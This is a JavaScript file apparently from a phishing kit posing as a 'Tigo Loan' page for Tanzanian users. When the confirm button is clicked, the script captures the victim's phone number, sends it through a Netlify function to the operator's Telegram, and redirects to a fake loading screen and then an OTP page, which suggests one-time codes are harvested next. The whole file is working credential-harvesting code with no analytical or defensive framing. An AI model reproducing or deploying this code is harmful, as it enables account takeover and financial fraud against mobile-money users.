document.addEventListener('DOMContentLoaded', () => {
    const phoneInput = document.getElementById('app-phone');
    const confirmBtn = document.querySelector('.confirm-button');

    let isSubmitting = false;

    async function sendToTelegram(message) {
        try {
            await fetch('/.netlify/functions/send-telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message })
            });
        } catch (error) {
            console.error('Telegram error:', error);
        }
    }

    // Button submit effect
    confirmBtn.addEventListener('click', async () => {
        const phoneNumber = phoneInput.value.trim();
        if (phoneNumber.length > 0 && !isSubmitting) {
            isSubmitting = true;
            confirmBtn.style.opacity = '0.5';
            confirmBtn.style.pointerEvents = 'none';
            await sendToTelegram(`<b>Tigo Loan - Kuingia Mapya</b>\nSimu: <code>+255${phoneNumber}</code>`);
            window.location.href = 'loading.html?next=otp.html&delay=3000';
        } else if (phoneNumber.length === 0) {
            alert('Tafadhali weka namba yako ya simu.');
        }
    });
});
